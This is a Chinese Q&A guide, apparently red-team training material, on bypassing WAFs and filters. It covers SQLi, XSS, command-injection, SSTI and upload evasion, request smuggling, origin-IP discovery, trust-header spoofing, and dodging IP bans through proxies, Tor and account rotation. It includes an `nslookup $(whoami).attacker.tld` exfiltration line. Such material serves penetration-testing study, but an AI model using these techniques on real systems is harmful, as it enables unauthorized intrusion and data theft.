# Web · WAF/过滤下的绕过决策

### 判断"到底有没有 WAF"再决定打法
**Q1**: payload 打过去被拦了,我怎么先确认这是 WAF 拦截还是应用层自己的逻辑报错?
**A1**: 看拦截"形态":WAF 通常返回固定的拦截页/403/自定义 block ID/连接 reset,且与业务响应体风格迥异;应用层报错则和正常业务同源(同样的模板、同样的 500 栈)。发一个绝对良性的请求和一个明显恶意的请求(如 `?x=<script>`),对比响应码、响应头(Server、cf-ray、X-*-ID)、响应时间、body 长度。若恶意请求触发一个"陌生"的响应指纹,基本就是 WAF。
**Q2**: 确认有 WAF 了,下一步的核心判据是什么?
**A2**: 判断它是"云 WAF(旁挂/CDN 前置)"还是"本地 WAF(模块/RASP)"。云 WAF 可尝试溯源真实 IP 绕过整个防护;本地 WAF/RASP 必须在 payload 层面对抗。用是否能拿到源站直连来分流这两条路。
**Q3**: 我连"是否触发"都判断不清,响应都长一样怎么办?
**A3**: 引入时间侧信道或错误侧信道:用一个必然引发后端处理耗时/报错的良性重载(如超长参数、畸形但合法的编码)去探边界,看拦截阈值。实在无信号就退回"盲打+外带(OOB)"思路,不依赖回显判断。
**Q4**: 这条"精细指纹识别"路走死了(响应被彻底统一化),往哪转?
**A4**: 转正交维度——放弃识别 WAF 型号,直接做"行为黑盒 fuzz":批量发送编码/大小写/分块变体,用统计学看哪一类变体的拦截率骤降,让数据告诉你绕过面,而不是靠识别产品去查已知 bypass。
**Q5**: 识别出了具体 WAF 产品有什么用?
**A5**: 有用但别依赖。已知产品→可查历史规则缺陷和公开 bypass 作为"先验起点",但规则会更新,公开 bypass 多半已被封。把它当第一发试探,不当答案。

### payload 被拦——先定位"是哪个字符/关键字触发的"
**Q1**: 一个完整 SQLi payload 被拦了,我该整体换 payload 还是先做别的?
**A1**: 先做"二分定位":把 payload 砍半发,拦就继续砍,通过就往回加,精确定位到触发拦截的最小 token(可能是 `union`、`sleep`、`/**/`、`0x`、某个引号组合)。不知道敌人拦什么就换 payload 是盲目消耗。
**Q2**: 定位到是关键字 `union select` 被拦,怎么办?
**A2**: 对该 token 施加变形正交手段:大小写混写、内联注释插入(`uni/**/on`)、等价语法替换(`union`→用其它注入结构如报错/布尔盲注绕开 union)、空白替换(空格→`/**/`、`%09`、`%0a`、`%a0`、括号)。一次只改被拦的那个 token,保持其余不变,才能验证是否奏效。
**Q3**: 单独变形那个 token 还是拦,说明什么?
**A3**: 说明规则是"组合/语义"级别的(如检测到"引号+SQL 关键字"共现),不是单 token 黑名单。此时要打散语义特征:改用完全不同的注入范式(盲注、堆叠、二次注入),让请求里根本不出现该组合。
**Q4**: 定位过程本身被限流/封 IP 了怎么办?
**A4**: 转基础设施维度:降低探测频率、用可轮换的出口(代理池)、把二分探测改为一次性携带多个候选的批量试探以减少请求数。定位策略服从于"不被封"这个前提。
**Q5**: 如何避免定位过程污染判断?
**A5**: 每次只改一个变量(单一变量原则),并保留一个已知"必被拦"和一个已知"必通过"的对照请求,随时校准 WAF 状态,防止把它临时封 IP 误判成 payload 有效。

### SQLi 关键字被过滤时的等价改写决策
**Q1**: 空格被过滤,注入还能不能继续?
**A1**: 能。空格有大量等价替换:内联注释 `/**/`、`%09`(tab)、`%0a`/`%0b`/`%0c`/`%0d`、`%a0`、括号包裹表达式 `union(select(...))`。逐个试,哪个通过用哪个。空格过滤几乎从不是致命的。
**Q2**: `and`/`or` 关键字被过滤呢?
**A2**: 用符号运算符替代:`&&`/`||`、用 `|`/`&` 位运算构造布尔、用数学比较 `=`/`>`/`like`/`in`/`between` 代替逻辑连接词。布尔盲注不一定非要字面 `and`。
**Q3**: 逗号被过滤,`substring(x,1,1)` 和 `limit 0,1` 都用不了怎么办?
**A3**: 用无逗号等价:`substring` 用 `from...for` 语法(`substring(x from 1 for 1)`)、`limit` 用 `offset` 子句、多列比较用 `join`/`like` 构造。逗号过滤是经典"看似封死实则有等价语法"的坑。
**Q4**: 各种等价改写全试完还是打不通,往哪转?
**A4**: 转注入通道/回显维度:从"我要在这个参数里构造完美语句"转向"换个受污染的参数、换 HTTP 方法(GET→POST/PUT)、换 Content-Type(表单→JSON→XML)"。同一漏洞点不同解析路径,WAF 规则覆盖常有盲区,尤其对 JSON body 里的 SQLi。
**Q5**: 怎么知道该优先试哪种等价?
**A5**: 按"后端数据库类型"排序试探。先探 DB 指纹(报错特征、函数可用性如 `@@version` vs `version()` vs `sqlite_version()`),不同 DB 的等价语法可用集不同,盲试等价是浪费,先定 DB 再选等价库。

### 编码层绕过的顺序决策
**Q1**: 我想用编码绕过关键字检测,该从哪种编码先试?
**A1**: 先想清楚"谁来解码"。URL 编码(`%xx`)由 Web 服务器解;双重 URL 编码(`%2520`)在有中间代理二次解码时才有效;HTML 实体、Unicode(`%u00xx`)、overlong UTF-8 由具体解析器解。判据是:编码必须在"WAF 检测之后、后端使用之前"被还原,才既骗过 WAF 又能生效。
**Q2**: 双重编码为什么有时有效有时无效?
**A2**: 取决于解码次数和 WAF 是否规范化(normalize)。若 WAF 只解一次而后端解两次,双编码就穿透;若 WAF 做了递归规范化,双编码反而被识别。所以要先摸清"这条链上一共解几次码"。
**Q3**: 试到 Unicode/宽字节绕过,什么场景最该想到它?
**A3**: 宽字节注入(如 `%df` 吃掉转义反斜杠)在 GBK 等多字节编码后端才有意义;Unicode 规范化绕过在会做 `NFKC` 折叠的框架里有效(如全角字符被折成半角关键字)。看到 charset=GBK 或框架有 Unicode 处理时优先试。
**Q4**: 所有编码变体都被规范化拦掉了,往哪转?
**A4**: 转"分块/协议层"维度:HTTP chunked transfer encoding 把 payload 切碎、`Transfer-Encoding` 与 `Content-Length` 冲突制造请求走私(request smuggling),让 WAF 和后端对"请求边界"理解不一致,从而 WAF 根本没看到完整 payload。
**Q5**: 怎么快速判断中间链路的解码行为?
**A5**: 用一个无害探针:发 `%2561`(双编码的 a),看回显里是 `a`、`%61` 还是 `%2561`,几层还原一目了然。用探针标定链路,再决定编码深度。

### XSS 被过滤时的绕过转向
**Q1**: `<script>` 被过滤,XSS 还能打吗?
**A1**: 能。XSS 触发面极广:换事件属性(`onerror`/`onload`/`onfocus`+`autofocus`)、换标签(`<img>`/`<svg>`/`<iframe>`/`<details>`)、换协议(`javascript:`)。`<script>` 只是最显眼的一种,过滤它几乎不影响 XSS 可行性。
**Q2**: 尖括号 `<` `>` 都被编码了,是不是就没戏了?
**A2**: 看注入上下文(context)。若注入点在 HTML 属性内,不需要尖括号——闭合引号加事件即可(`" onmouseover=alert(1) x="`);若在 JS 字符串内,闭合引号直接写 JS;若在 URL/`href` 上下文,用 `javascript:`。上下文决定是否真的需要尖括号。
**Q3**: `alert`/`eval` 等关键字被拦怎么办?
**A3**: JS 有无穷等价执行方式:`window['ale'+'rt']`、`top[...]`、模板字符串、`Function` 构造、`setTimeout`、从 DOM 取字符串拼接。JS 是图灵完备的,关键字黑名单在 JS 层几乎必败。
**Q4**: 反射位置做了强 HTML 编码,标签事件全废,往哪转?
**A4**: 转 DOM XSS / 其它 sink:检查前端 JS 是否把某参数写入 `innerHTML`、`document.write`、`location`、`eval`——服务端编码管不到纯前端 sink。或转向存储型入口(个人资料、文件名、UA、Referer 等次要输入常绕过主输入的过滤)。
**Q5**: 客户端有 CSP 挡住内联脚本呢?
**A5**: 转 CSP 绕过维度:找白名单域上的 JSONP/开放跳转/可控 CDN 路径、寻找 `unsafe-eval`/`nonce` 复用缺陷、用 `<base>` 标签或 dangling markup 外带数据。CSP 严不严决定 XSS 是"执行 JS"还是退化为"数据外带"。
**Q6**: 怎么高效枚举可用标签/事件?
**A6**: 不手撸,用已知的 XSS polyglot 和向量清单批量喷,统计哪些标签/事件穿透 WAF,再在通过的载体上精修 JS。先找"运输载体"再装"弹头"。

### 上传点被过滤时的绕过链
**Q1**: 上传 webshell,后缀 `.php` 被拦,先试什么?
**A1**: 先分清拦在"前端 JS 校验"还是"后端校验"。前端校验直接抓包改后缀即绕。后端则枚举等价可执行后缀(`.php3`/`.php5`/`.phtml`/`.pht`,或 `.jsp`/`.jspx`,或 `.asp`/`.aspx`/`.ashx`),取决于中间件解析配置。
**Q2**: 后缀白名单只允许图片,怎么办?
**A2**: 分两个正交方向:一是"内容+后缀"绕过(图片马 + 解析漏洞/文件包含触发执行);二是攻击解析层本身(Apache 多后缀 `.php.jpg`、Nginx `%00` 截断或 `x.jpg/x.php` 路径解析、IIS 分号解析)。判据是目标中间件版本对应的解析特性。
**Q3**: Content-Type 校验和文件头校验都做了呢?
**A3**: Content-Type 直接改包伪造;文件头加合法魔数(如 `GIF89a`)在真实内容前。二者都是可伪造的客户端/浅层信号,同时满足即可。
**Q4**: 后端用图像库二次渲染(re-encode)把马洗掉了,往哪转?
**A4**: 这是硬防御。转向"不依赖上传内容执行"的路径:利用文件名注入(路径穿越 `../`、文件名里的 XSS/命令注入)、利用 zip 解压穿越(zip slip)、或转攻其它功能点。二次渲染基本封死内容马,别硬刚,换攻击面。
**Q5**: 能传但传上去找不到落地路径/无法访问怎么办?
**A5**: 转信息收集:从返回的 URL、报错、时间戳命名规律、备份文件(`.git`/`.svn`/`www.zip`)、目录爆破推断落地目录;或改打"上传+文件包含"组合,不需要直接访问 shell 路径。
**Q6**: `.htaccess`/`web.config` 能不能利用?
**A6**: 若可上传解析配置文件,上传一个 `.htaccess` 让某无害后缀被当 PHP 解析,再传该后缀的马。这是绕后缀白名单的高价值路线,前提是目录允许覆盖配置。

### 命令注入被过滤时的字符替代
**Q1**: 命令注入点把空格过滤了,还能执行命令吗?
**A1**: 能。Linux 下空格等价:`${IFS}`、`$IFS$9`、`<`/`<>` 重定向、`{cmd,arg}` 花括号展开、Tab。空格几乎从不是命令注入的终点。
**Q2**: 关键命令名(如 `cat`/`bash`/`curl`)被黑名单拦怎么办?
**A2**: 字符串拆分绕过:`c""at`、`c\at`、`ca$@t`、通配符 `/bin/c?t`、`/???/c*t`、变量拼接、`$(rev<<<tac)` 反转。命令名在 shell 里有无数等价写法,黑名单封不住。
**Q3**: 分隔符 `;` `|` `&` 都被过滤呢?
**A3**: 用换行 `%0a`、`$(...)`/反引号命令替换、`&&`/`||`(若只封了单字符)、或利用参数注入(argument injection)让目标程序自己执行子命令。分隔符只是触发方式之一。
**Q4**: 命令能执行但无回显,怎么确认成功?
**A4**: 转 OOB 外带:用 DNS 请求(`nslookup $(whoami).attacker.tld`)、HTTP 回连、时间盲(`sleep`)确认执行。无回显不等于失败,换验证信道。
**Q5**: 各种绕过都被一个很严的过滤挡住,往哪转?
**A5**: 转"注入位置/解析器"维度:该输入是否还流向别处(日志、文件名、被另一个组件二次解析)?是否有 argument injection 空间(往已有命令塞 `-o`/`--`)?或者根本换漏洞类别——命令注入被封死时,SSTI/反序列化/文件写入可能是更省力的 RCE 路径。
**Q6**: 目标是 Windows 不是 Linux 呢?
**A6**: 换等价库:空格用 `,` 或 tab,变量用 `%CD:~n,1%` 拼字符,`^` 转义插入,PowerShell 的 `-enc` base64。先确认 OS/shell 再选绕过语法,拿 Linux 技巧硬套 Windows 是白费。

### SSTI 关键字/字符被过滤
**Q1**: 怀疑 SSTI 但 `{{` 或 `}}` 被过滤,怎么办?
**A1**: 先确认引擎。不同模板引擎语法不同:Jinja2 是 `{{}}`/`{%%}`,还有 `{%...%}` 语句块可用;有些引擎支持 `${}`、`#{}`、`<%= %>`。`{{` 被过滤时换引擎支持的其它定界符,或用语句块标签。
**Q2**: 沙箱把 `__class__`/`__mro__`/`__globals__` 等属性名过滤了?
**A2**: 用等价访问绕过:`attr()` 过滤器、`request` 对象取属性、`|attr('\x5f\x5fclass\x5f\x5f')` 十六进制、`getattr` 链、`['__cla'+'ss__']` 拼接。沙箱黑名单属性名几乎总能用属性访问的等价形式绕开。
**Q3**: 关键内建(如 `os`、`subprocess`、`popen`)被拦?
**A3**: 换 gadget 链找可达的执行原语:从 `__subclasses__` 里枚举可用类(文件读写类、`Popen`、`warnings` 里的 import)、用 `lipsum`/`cycler`/`request` 等已暴露对象的 `__globals__` 找 `os`。SSTI 的本质是找一条到达危险原语的对象图路径,单个关键字被封只需换路径。
**Q4**: 沙箱太严,所有 RCE gadget 都不可达,往哪转?
**A4**: 降级利用:即使不能 RCE,SSTI 常可读文件、读配置(拿密钥/数据库口令)、SSRF、信息泄露。或转正交漏洞。RCE 打不通不代表 SSTI 无价值,先榨取读取能力。
**Q5**: 怎么先低成本确认是不是 SSTI 而非 XSS?
**A5**: 打数学探针 `{{7*7}}`(及各引擎变体 `${7*7}`/`#{7*7}`),回显 `49` 即服务端求值=SSTI;回显原文=非 SSTI 或定界符错。用求值探针区分 SSTI 与反射,别把 XSS 当 SSTI 硬打。

### 参数污染与解析差异绕过
**Q1**: 单个参数被 WAF 严格检查,有没有办法让它看不全?
**A1**: HTTP 参数污染(HPP):发送同名参数多次(`?id=1&id=2`),WAF 和后端可能取不同的值(WAF 取第一个、后端取最后一个或拼接)。把恶意 payload 拆到多个同名参数,让 WAF 每段都觉得无害。
**Q2**: 后端是怎么合并重复参数的,我怎么知道?
**A2**: 与语言/框架强相关:某些拼接、某些取首、某些取尾、某些放数组。发探测请求观察后端最终用了哪个值。不测就用是碰运气。
**Q3**: 参数放在不同位置(query、body、cookie、header)呢?
**A3**: 参数来源污染:同名参数分散在 URL query 与 POST body,某些框架统一合并而 WAF 只查其一。把 payload 藏进 WAF 较少检查的来源(cookie、自定义 header、JSON 嵌套字段)。
**Q4**: 这套参数戏法全失效,往哪转?
**A4**: 转 Content-Type 解析差异:把请求体从 `application/x-www-form-urlencoded` 换成 `multipart/form-data`(可加干扰边界)、`application/json`、甚至 XML。WAF 对非常规 Content-Type 的解析常远弱于对表单的解析,后端却照收。
**Q5**: 判据是什么,怎么知道值得试?
**A5**: 只要目标接口"能接受多种输入格式"或"框架自动内容协商",就值得试解析差异。反之接口死板只收一种格式则收益低,把精力放别处。

### 被封 IP 后的基础设施转向
**Q1**: 打着打着 IP 被封了(所有请求 403/reset),先判断什么?
**A1**: 判断封禁粒度和时长:是临时限速(几分钟自动解)、会话封禁(换 cookie/UA 即恢复)、还是 IP 级永封。发几个良性请求测是否连正常访问都断,判断封禁层级,再决定成本最低的恢复方式。
**Q2**: 确认是 IP 级封禁,怎么继续?
**A2**: 换出口:代理池/住宅 IP 轮换、云厂商弹性 IP、Tor(慢但有效)。同时把攻击节奏降下来避免新 IP 又被封。基础设施问题用基础设施手段解。
**Q3**: 换 IP 成本高或都被封段,还有别的路吗?
**A3**: 转"绕过封禁触发"本身:降低指纹相似度(轮换 UA/顺序/TLS 指纹 JA3)、拉长请求间隔、模拟人类行为。很多封禁是行为触发的,让行为像正常用户就不触发。
**Q4**: 目标在 CDN 后,能不能绕过 CDN 的封禁直连源站?
**A4**: 值得优先试。源站真实 IP 常泄露在:历史 DNS 记录、SSL 证书透明度日志、子域名(邮件/后台)、SPF 记录、error 页 IP、favicon hash 搜索引擎(Shodan/Censys/fofa)。拿到源站直连,CDN/云 WAF 整层失效。
**Q5**: 直连源站需要注意什么坑?
**A5**: 源站常配置只信 CDN 回源 IP(白名单),直连会被拒;需伪造 CDN 的回源 header 或找未配置白名单的源站。且要带对 Host 头,否则源站返回默认站点。验证真实 IP 时用 Host 头指定目标域比对 body。

### 限速/风控下的节奏决策
**Q1**: 需要爆破/盲注大量请求,但有速率限制,怎么权衡?
**A1**: 先测阈值:逐步加速找到触发限速的 QPS,然后贴着阈值下方跑。盲目全速只会触发风控前功尽弃,慢而稳的吞吐 > 快而被封。
**Q2**: 盲注太慢(逐字符),有没有加速办法?
**A2**: 换算法降请求数:布尔盲注升级为二分/位运算(每字符从 ~8 次降到 ~7 次,或用比较一次定位)、多字符并行、报错注入/联合注入一次拿多字节。请求数是瓶颈时优化的是"每请求信息量"。
**Q3**: 限速是按账号/token 而非 IP 呢?
**A3**: 转身份维度:批量注册/复用多个账号 token 轮换、找不需要认证的等价接口、找限速豁免的内部/移动端 API。限速的 key 是什么就攻击那个 key 的可复制性。
**Q4**: 各种加速和身份轮换都不够快,任务窗口不够,往哪转?
**A4**: 转"不需要海量请求的等价利用":能否把盲注变成基于 OOB 的批量外带(一次请求带出多字节到 DNS)、能否找到直接回显的注入点、能否读文件/读配置一步到位。从"逐字符猜"转向"整块拿"。
**Q5**: 怎么避免把限速误判成漏洞不存在?
**A5**: 保留对照:限速期间良性 payload 也会失败。用一个已验证有效的 payload 周期性复测,区分"被限速"与"漏洞真无效",别在限速窗口里错杀正确 payload。

### 大小写/关键字变形的适用边界
**Q1**: 我总用大小写混写绕关键字,它什么时候有效什么时候无效?
**A1**: 取决于两点:WAF 规则是否大小写敏感、后端语法是否大小写不敏感。SQL 关键字后端大小写不敏感,所以 `SeLeCt` 后端照跑;若 WAF 规则也不区分大小写,则此招无效。先判 WAF 规则敏感性再决定用不用。
**Q2**: 大小写无效,内联注释也无效,怎么办?
**A2**: 说明 WAF 做了规范化(去注释、统一大小写)后再匹配。此时字符级变形基本都废,要上语义级绕过:换等价函数、换注入范式、换编码或分块让 WAF 拿不到完整语义。
**Q3**: 怎么快速判 WAF 有没有做规范化?
**A3**: 发 `SeL/**/eCt` 这种同时叠加大小写+注释的探针,若被拦说明有强规范化;若通过说明是弱黑名单。用叠加探针一次问出规范化强度。
**Q4**: 遇到强规范化 WAF,整体往哪个方向转?
**A4**: 转"WAF 看不到 payload"的维度而非"变形 payload":请求走私、参数污染、Content-Type 切换、协议层分块。强规范化的 WAF 只要能拿到完整 payload 就难绕,那就让它拿不到完整 payload。
**Q5**: 变形绕过成功后要注意什么?
**A5**: 记录哪个具体变形通过了并固化到后续所有 payload,同时警惕 WAF 可能动态学习/更新规则,准备第二套变形做备份。绕过是有保质期的。

### 注入点无回显时的盲打决策树
**Q1**: 确认有注入但页面完全无回显、无报错,下一步选哪种盲注?
**A1**: 按信道可用性排序:先试布尔盲(页面有任何"真/假"差异,如长度、状态码、关键字),其次时间盲(`sleep`/`benchmark`/重计算),最后 OOB 外带。优先信息量大且稳定的信道,时间盲最慢最不稳,放后面。
**Q2**: 布尔盲注的"真假差异"很微弱,怎么放大?
**A2**: 找更敏感的差异指示器:响应长度差、是否出现某关键 DOM、重定向与否、HTTP 状态、甚至下游功能是否触发(如是否发邮件)。差异不明显就换更灵敏的观测点。
**Q3**: 目标出网受限,OOB 打不出去怎么办?
**A3**: 退回时间盲,并优化其稳定性:多次采样取中位数、用可控的大延迟(条件 `sleep(5)`)提高信噪比、避开网络抖动。出网不通时时间盲是唯一选择,但要做统计降噪。
**Q4**: 时间盲也被 WAF 拦了 `sleep`/`benchmark`,往哪转?
**A4**: 转等价耗时原语:重笛卡尔积查询、正则回溯(`RLIKE`/`REGEXP` 灾难性回溯)、大数据类型转换、递归。时间信道不依赖特定函数名,任何"能让后端算得久"的构造都行。
**Q5**: 所有盲注信道都极不稳定,几乎拿不到数据,往哪转?
**A5**: 转攻击面本身:换一个可能有回显的注入点、换漏洞类型、找信息泄露直接读配置。当信道成本高到不可用,换战场比硬啃更理性。

### 二次注入 / 存储型绕过前端过滤
**Q1**: 输入点前端过滤很严,所有 payload 当场被拦,还有戏吗?
**A1**: 有。想"二次注入":数据在入库时被转义/过滤,但在另一处被取出再次拼接使用时未过滤。找"写入严格、读取拼接"的功能对(如注册时过滤、后台展示时拼 SQL)。前端严不代表全链路严。
**Q2**: 怎么找到二次触发点?
**A2**: 追踪数据流:一个字段在哪些地方被展示/被拼接(个人资料→后台管理页、订单备注→发票生成、文件名→日志)。让 payload 静默入库,在下游 sink 触发。核心是数据的"旅行路径"。
**Q3**: 入库时会截断/转义,payload 存不进去完整怎么办?
**A3**: 适配存储约束:构造在转义后仍有效的 payload(如利用编码在读取时还原)、利用字段长度边界做截断攻击、把 payload 拆到多个字段在下游拼接。让 payload 活着到达 sink 是首要目标。
**Q4**: 找不到二次 sink,存储型路走死,往哪转?
**A4**: 转"次要输入点":HTTP header(UA、Referer、X-Forwarded-For)、cookie、文件元数据、API 的隐藏字段——这些常被主表单的过滤覆盖不到,却同样入库/被后端使用。主入口严就攻旁门。
**Q5**: 存储型 XSS 的特殊考量是什么?
**A5**: 触发上下文可能与输入处完全不同(输入是纯文本框,输出在富文本/属性/JS 上下文)。要以"输出点的上下文"而非"输入点"来构造 payload,否则存进去了却不触发。

### JSON/XML body 的 WAF 盲区利用
**Q1**: 表单参数被 WAF 死盯,接口也支持 JSON,值得换吗?
**A1**: 很值得。大量 WAF 对 `application/json` 和嵌套 JSON 的检测远弱于表单,尤其深层嵌套、数组、Unicode 转义(`'`)里的 payload 常被漏检,后端 JSON 解析器却照常还原。优先把注入点从表单迁到 JSON。
**Q2**: JSON 里具体怎么藏 payload?
**A2**: 用 JSON 原生的编码能力:`\u00XX` Unicode 转义关键字、嵌套对象/数组分散、利用 JSON 解析器对重复 key/尾随逗号的宽容制造 WAF 与后端的解析差异。
**Q3**: 目标接口只收表单不收 JSON 怎么办?
**A3**: 试 Content-Type 混淆:改 `Content-Type: application/json` 但发表单体,或反之,看后端是否宽容解析(很多框架按内容猜)。若后端能吃而 WAF 按声明的类型放行,就穿了。
**Q4**: JSON 路也被覆盖了,还有别的解析器可试吗?
**A4**: 转 XML/multipart:XML 可带来 XXE 附加攻击面且 WAF 覆盖更弱;multipart 可插入多余边界/字段名干扰 WAF 解析。哪种解析器 WAF 最弱就用哪种,同时留意新解析器带来的新漏洞类别(XXE)。
**Q5**: 怎么判断后端支持哪些 Content-Type?
**A5**: 观察正常业务流量用什么、报错信息暴露的框架、以及主动发不同 Content-Type 看是 415(不支持)还是正常处理。用 415 与否快速枚举可用解析器。

### 请求走私 / 分块传输突破边界检测
**Q1**: WAF 规范化太强,payload 变形全废,考虑请求走私值得吗?
**A1**: 当"前端代理/WAF"与"后端服务器"对请求边界解析不一致时非常值得。核心是 `Transfer-Encoding` 与 `Content-Length` 的处理差异(TE.CL / CL.TE),让 WAF 只看到前半段良性请求,恶意部分被后端当作下一个请求处理,完全绕过检测。
**Q2**: 怎么先确认存在走私可能?
**A2**: 用延时探针:构造一个会让后端"等待更多数据"而超时的畸形请求,观察响应时间异常;或用差异请求看是否影响到后续请求。有明确时序/污染信号才继续,走私探测要谨慎避免影响他人。
**Q3**: chunked 编码本身能绕检测吗?
**A3**: 能。把 payload 用 chunked 切成碎块,WAF 若不重组 chunk 就匹配不到完整关键字,后端重组后照常执行。对不做 chunk 重组的 WAF 是干净绕过。
**Q4**: 走私/分块都不奏效(链路对齐良好),往哪转?
**A4**: 说明前后端解析一致,走私面关闭。转回 payload 语义层绕过,或转协议降级/HTTP 版本差异(HTTP/1.1 vs HTTP/2 降级走私)。HTTP/2 到 HTTP/1.1 的降级是新的边界差异来源。
**Q5**: 这类技术风险高,决策上要注意什么?
**A5**: 走私可能影响同一入口的其他用户请求,在授权范围和稳定性上都要克制。评估收益:只有当常规绕过全失败且授权允许时才动用,不作为首选。

### 从 WAF 拦截响应里榨取情报
**Q1**: payload 被拦只返回一个 block 页,这页面还有价值吗?
**A1**: 有。拦截响应本身是情报:block ID/ray ID 指示 WAF 产品和规则;拦截的"精确 token"暴露规则关键字集;不同 payload 的拦/放对比能反推规则边界。把每次拦截当作对规则的一次探测反馈。
**Q2**: 怎么系统化利用这些反馈?
**A2**: 建"拦截矩阵":固定其余、逐个变量试探,记录每个 token/编码/位置的拦放结果,拼出 WAF 的规则地图。有了地图就能构造精确穿过所有已知规则缝隙的 payload。
**Q3**: 拦截页信息被彻底最小化(只有纯 403)呢?
**A3**: 转时间/长度侧信道:即使 body 一样,拦截与放行的响应时间、连接行为可能有细微差异。用统计方法从最小化响应里榨取拦放信号。
**Q4**: 连侧信道都没有,规则地图画不出来,往哪转?
**A4**: 转"公开先验 + 黑盒喷射":用识别出的 WAF 产品查公开 bypass 库作为起点,配合大规模变体喷射,靠覆盖面而非精确建模找缝。无法精测就用广度换深度。
**Q5**: 这些情报怎么复用?
**A5**: 一旦摸清某 WAF 的规则缝(如它不查某编码/某来源),把这条缝固化成模板,套用到该目标所有注入点。规则是全站统一的,一处缝往往处处可用。

### 逻辑绕过——不打 payload 而打业务逻辑
**Q1**: 技术绕过全被 WAF 挡,是不是该考虑非注入路径?
**A1**: 是。WAF 主防"恶意 payload 特征",对"合法请求的逻辑滥用"几乎无感。转向逻辑漏洞:越权(IDOR)、状态机绕过(跳过支付步骤)、竞态条件、密码重置逻辑、验证码/OTP 逻辑缺陷。这些请求本身完全"干净",WAF 无从拦起。
**Q2**: 怎么找逻辑漏洞的切入点?
**A2**: 关注"信任假设":哪些参数客户端可控但服务端未复核(价格、用户 ID、角色、数量可为负)、哪些步骤顺序未强制、哪些操作可并发。逻辑漏洞=打破开发者的隐含假设。
**Q3**: 逻辑漏洞和 WAF 绕过在决策上怎么排序?
**A3**: 当目标 WAF 极强、注入面被压制时,逻辑路径的性价比反超。红队应动态调整:注入受阻的时间成本一旦超过预算,就转逻辑面,而不是在 payload 变形上无限内卷。
**Q4**: 逻辑面也没发现问题,回到技术面还有什么没试?
**A4**: 转"WAF 规则本身的逻辑绕过":超长请求让 WAF 放弃检测(size limit bypass)、WAF 不检测的 HTTP 方法(`PUT`/`PATCH`/`TRACE`)、WAF 对某些路径/静态资源不检测(把攻击藏进它认为无害的路径)。攻 WAF 的部署盲区。
**Q5**: 判断"WAF 有部署盲区"的信号是什么?
**A5**: 观察哪些路径/方法/大小的请求响应特征里没有 WAF 指纹(无 block header、无延迟)。那些"WAF 没管"的区域就是盲区,把攻击迁过去。

### 超大请求 / 边界值让 WAF 放弃检测
**Q1**: 听说超长请求能绕 WAF,原理和判据是什么?
**A1**: 多数 WAF 为性能只检测请求的前 N 字节(如前 8KB)。在 payload 前填充大量无害数据把恶意部分推到检测窗口之外,后端却完整解析。判据:目标 WAF 存在检测 size 上限且后端无同等上限。
**Q2**: 填充放哪里、填什么?
**A2**: 填在被检测区域(通常 body 开头),用无害且不改变语义的内容(大量参数、注释、空白、无关字段)。让 payload 落在检测窗口之后、又不破坏后端解析。
**Q3**: 填充太大反被 WAF 直接拦(size 超限即 block)怎么办?
**A3**: 二分找"WAF 放弃检测"与"WAF 直接拦超限"之间的甜蜜点。有的 WAF 是超限就放行,有的是超限就拦,试探边界行为决定填多少。
**Q4**: 这条路无效(WAF 全量检测无 size 上限),往哪转?
**A4**: 转"压缩/编码让 WAF 解析成本高而放弃":gzip 请求体、畸形但合法的编码。或彻底转 payload 语义层。size 绕过失败说明这个 WAF 舍得算力,只能拼语义。
**Q5**: 怎么低成本先验证 size 绕过可行?
**A5**: 用一个"必被拦的最短 payload"在前面加不同量级填充,观察在哪个大小突然从"拦"变"放"。那个跳变点就是检测窗口边界。

### 多 WAF 层叠 / 顺序解析的缝隙
**Q1**: 目标疑似有多层防护(CDN WAF + 本地 RASP),决策上怎么拆?
**A1**: 分层各个击破。先判断请求依次经过哪些层(响应头指纹、延迟分层)。绕 CDN WAF 的技巧(编码、size)对 RASP 无效,因为 RASP 在应用运行时看真实调用。要针对最内层(通常最强)选打法。
**Q2**: RASP 这种运行时防护怎么对抗?
**A2**: RASP 看的是危险函数调用而非 payload 特征,字符变形基本无效。要么让危险操作不经过被 hook 的函数(换等价 API、换语言原语),要么走 RASP 未覆盖的漏洞类别。RASP 强的地方(SQL/命令执行)避开,打它弱的地方(SSRF、逻辑、反序列化中未 hook 的 gadget)。
**Q3**: 多层之间有没有可利用的解析差异?
**A3**: 有。层与层对同一请求理解不一致就是缝:外层 CDN 解码一次、内层再解一次、后端第三次。多层解码差异是双/三重编码绕过的温床。层越多,规范化不一致的概率越大。
**Q4**: 所有层都严丝合缝,往哪转?
**A4**: 转"绕过外层直连内层"(源站直连跳过 CDN WAF)或"用内层信任外层的假设"(伪造外层注入的可信 header,如 `X-Forwarded-For`、内部认证头,让内层以为请求已被外层清洗/认证)。攻击层间的信任传递。
**Q5**: 怎么判断哪一层是瓶颈?
**A5**: 逐层剥离测试:直连源站看本地防护表现,经 CDN 看叠加表现,对比得出每层各拦什么。分离变量才能知道该主攻哪层。

### 时间盲注在网络抖动下的可靠性
**Q1**: 用时间盲注但结果时对时错,是 payload 问题还是网络问题?
**A1**: 先排除网络:对同一条件重复采样,若延迟方差大说明网络抖动主导。设一个远大于抖动的阈值延迟(如 `sleep(10)`),用中位数判定,别用单次采样下结论。
**Q2**: 目标本身响应就慢,基线延迟高怎么办?
**A2**: 先测"无注入基线延迟"和"注入 sleep(N) 延迟",取差值判定而非绝对值。基线校准后再判,否则会把服务器本身的慢误读成注入成功。
**Q3**: 加大延迟又触发 WAF 或请求超时怎么办?
**A3**: 找"够区分又不超时"的延迟窗口:在网络抖动 P95 之上、在 WAF/网关超时之下。二分这个窗口。太大触发防护,太小淹没在噪声里。
**Q4**: 时间盲实在太不可靠、太慢,往哪转?
**A4**: 转 OOB 外带(若出网可用,一次请求带多字节,不受时序噪声影响)或重新找布尔差异信道。时间盲是最后选择,一旦有更稳信道立刻切换。
**Q5**: 怎么减少时间盲的总请求数?
**A5**: 用条件位运算一次判定一个比特而非线性猜字符、用重量级 sleep 只对"真"分支触发做二分。优化的是每次时间探测承载的信息量。

### 认证 header / 内部信任头伪造
**Q1**: 某功能提示"仅内网/仅管理员可访问",被前置拦截,怎么绕?
**A1**: 试伪造信任来源头:`X-Forwarded-For`、`X-Real-IP`、`X-Originating-IP`、`Client-IP` 设成 `127.0.0.1`/内网段,骗过基于来源 IP 的访问控制。很多应用天真信任这些可伪造的 header。
**Q2**: IP 头无效,还有别的信任头吗?
**A2**: 试 `X-Forwarded-Host`/`X-Original-URL`/`X-Rewrite-URL`(路径覆盖绕过前置 ACL)、自定义内部认证头(`X-Internal`、`X-Auth`)。前置代理常按路径做 ACL,用 URL 覆盖头让后端看到的路径与代理判断的不一致。
